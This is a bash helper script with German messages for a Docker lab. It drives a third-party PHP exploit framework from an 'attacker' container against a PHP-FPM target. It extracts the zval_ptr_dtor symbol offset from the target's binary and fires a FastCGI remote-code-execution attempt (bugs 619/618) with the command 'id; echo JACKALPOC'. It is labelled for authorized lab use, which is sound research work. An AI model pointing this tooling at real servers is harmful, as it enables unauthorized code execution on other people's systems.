#!/usr/bin/env bash
# Run Jackalsyn php_up_framework.py from third_party/ against lab target (authorized lab only).
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
# shellcheck source=scripts/docker-env.sh
source "$ROOT/scripts/docker-env.sh"
ACTION="${1:-help}"
TARGET_CONTAINER="${TARGET_CONTAINER:-vtbw-php2shell-target}"

find_framework() {
  find "$ROOT/third_party" -name 'php_up_framework.py' 2>/dev/null | head -1
}

FRAMEWORK_HOST="$(find_framework)"
cd "$ROOT"

case "$ACTION" in
  help|status)
    dest="$ROOT/third_party/php-up-2026"
    cat <<EOF
Jackalsyn (PHP-UP-2026) — Bundle wird NICHT automatisch geladen

Erwarteter Pfad:
  $dest/bin/php_up_framework.py

Aktuell: ${FRAMEWORK_HOST:-FEHLT — siehe unten}

Installation (automatisch):
  $ROOT/scripts/fetch-jackalsyn.sh
  oder Menü [5] → fetch-jackalsyn

  Enthält: php-up-2026 (Framework) + jackalsyn-reup.zip (Repro-Skripte, SHA256 geprüft)

  Dann FPM-Lab: Menü [1] → Target starten → selftest → syms → lab

Befehle:
  $0 status|help   diese Anleitung
  $0 selftest      php_up_framework.py --selftest
  $0 syms          Symbol-Deltas vom PHP im Target-Container
  $0 lab           --lab (braucht --dtor aus syms)
  $0 paths         gefundener Framework-Pfad
EOF
    exit 0
    ;;
  paths)
    echo "Framework (Host): ${FRAMEWORK_HOST:-<nicht gefunden>}"
    echo "Mount im Container: /opt/third_party"
    ;;
  selftest)
    if [[ -z "$FRAMEWORK_HOST" ]]; then
      echo "FEHLER: fetch-jackalsyn zuerst" >&2
      exit 1
    fi
    REL="${FRAMEWORK_HOST#"$ROOT/third_party/"}"
    FW_CONTAINER="/opt/third_party/$REL"
    docker compose --profile tools run --rm attacker \
      python3 "$FW_CONTAINER" --selftest
    ;;
  syms|lab)
    if [[ -z "$FRAMEWORK_HOST" ]]; then
      echo "═══════════════════════════════════════════════════════════════" >&2
      echo "  Jackalsyn: Bundle fehlt (Menü [5] ist optional, kein Lab-Fehler)" >&2
      echo "═══════════════════════════════════════════════════════════════" >&2
      echo >&2
      echo "  Zielordner:" >&2
      echo "    $ROOT/third_party/php-up-2026/bin/php_up_framework.py" >&2
      echo >&2
      echo "  Ohne Jackalsyn funktionieren Menü [1] FPM, [2] Zer061, [3] Scan, [4] rsas." >&2
      echo "  Anleitung:  $0 status" >&2
      echo "  Oder Menü [5] → [0] Status/Anleitung (nach Update)" >&2
      exit 1
    fi
    if ! docker ps --format '{{.Names}}' | grep -qx "$TARGET_CONTAINER"; then
      echo "Target läuft nicht — zuerst: $ROOT/scripts/lab-up.sh" >&2
      exit 1
    fi
    REL="${FRAMEWORK_HOST#"$ROOT/third_party/"}"
    FW_CONTAINER="/opt/third_party/$REL"
    case "$ACTION" in
      syms)
        echo "[jackalsyn] Kopiere PHP-Binary aus Target (für --syms)…"
        TMPBIN="$(mktemp)"
        src=""
        for cand in /usr/local/sbin/php-fpm /usr/local/bin/php; do
          if docker exec "$TARGET_CONTAINER" test -x "$cand" 2>/dev/null; then
            src="$cand"
            break
          fi
        done
        if [[ -z "$src" ]]; then
          echo "FEHLER: keine PHP-Binary im Target" >&2
          exit 1
        fi
        docker cp "$TARGET_CONTAINER:$src" "$TMPBIN"
        chmod +x "$TMPBIN"
        set +e
        out="$(docker compose --profile tools run --rm \
          -v "$TMPBIN:/tmp/lab-php:ro" \
          attacker python3 "$FW_CONTAINER" --syms --binary /tmp/lab-php 2>&1)"
        rc=$?
        set -e
        echo "$out"
        rm -f "$TMPBIN"
        if [[ "$rc" -ne 0 ]] || echo "$out" | grep -q 'symbols not found'; then
          echo "[jackalsyn] Hinweis: Image oft stripped — bekannte Deltas in $ROOT/third_party/php-up-2026/deltas/" >&2
          ls "$ROOT/third_party/php-up-2026/deltas/" 2>/dev/null || true
        else
          dtor="$(echo "$out" | sed -n "s/.*'zval_ptr_dtor': '\\(0x[^']*\\)'.*/\\1/p" | head -1)"
          if [[ -n "$dtor" ]]; then
            mkdir -p "$ROOT/third_party/php-up-2026/out"
            echo "DTOR=$dtor" >"$ROOT/third_party/php-up-2026/out/jackalsyn-syms.env"
          fi
        fi
        ;;
      lab)
        DTOR="$("$ROOT/scripts/jackalsyn-resolve-dtor.sh")"
        BUG="${JACKALSYN_BUG:-619}"
        HOST="${JACKALSYN_LAB_HOST:-target}"
        PORT="${JACKALSYN_LAB_PORT:-9000}"
        SCRIPT="${JACKALSYN_LAB_SCRIPT:-/var/www/html/index.php}"
        CMD="${JACKALSYN_COMMAND:-id; echo JACKALPOC}"
        echo "[jackalsyn] FCGI --lab → ${HOST}:${PORT} script=$SCRIPT bug=$BUG dtor=$DTOR"
        echo "[jackalsyn] (Target muss nach www.conf-Änderung neu gebaut sein: lab up)"
        set +e
        docker compose --profile tools run --rm attacker \
          python3 "$FW_CONTAINER" --lab --bug "$BUG" --dtor "$DTOR" \
          --lab-host "$HOST" --lab-port "$PORT" --lab-script "$SCRIPT" \
          --command "$CMD"
        rc=$?
        set -e
        if [[ "$rc" -ne 0 ]] && [[ "$BUG" == "619" ]]; then
          echo "[jackalsyn] bug 619 ohne Hit — versuche bug 618 …" >&2
          docker compose --profile tools run --rm attacker \
            python3 "$FW_CONTAINER" --lab --bug 618 --dtor "$DTOR" \
            --lab-host "$HOST" --lab-port "$PORT" --lab-script "$SCRIPT" \
            --command "$CMD"
        fi
        echo "[jackalsyn] Hinweis: Jackalsyn Writeup: cached-pointer RCE oft tot; Erfolg = command_in_body True"
        echo "[jackalsyn] Voll-RCE ohne LFI: Menü [2] Zer061 oder [1] shell (Chain A)"
        ;;
    esac
    ;;
  *)
    echo "Unbekannt: $ACTION — $0 help" >&2
    exit 2
    ;;
esac
